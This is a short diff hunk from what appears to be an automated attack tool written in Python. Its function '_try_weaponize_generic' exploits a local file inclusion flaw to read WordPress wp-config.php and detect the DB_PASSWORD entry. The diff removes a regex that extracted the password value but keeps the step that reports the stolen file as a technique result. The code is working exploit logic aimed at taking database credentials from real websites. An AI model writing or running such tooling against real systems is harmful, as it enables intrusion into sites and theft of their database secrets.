@@ -8399,10 +8399,7 @@ def _try_weaponize_generic(
                     else:
                         body_w = _send_weap(data_override=dict(_all_params, **p_override))
                     if fname == "wp-config.php" and "DB_PASSWORD" in body_w:
-                        db_pass_m = _re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]{1,80})['\"]",
-                                               body_w)
-                        db_pass = db_pass_m.group(1) if db_pass_m else "extracted"
-                        step(f"weaponize/lfi: wp-config.php extraido — DB_PASSWORD presente")
+                        step("weaponize/lfi: wp-config.php extraido — DB_PASSWORD presente")
                         return {
                             "technique": "lfi_wp_config",
                             "data": {"file": "wp-config.php",
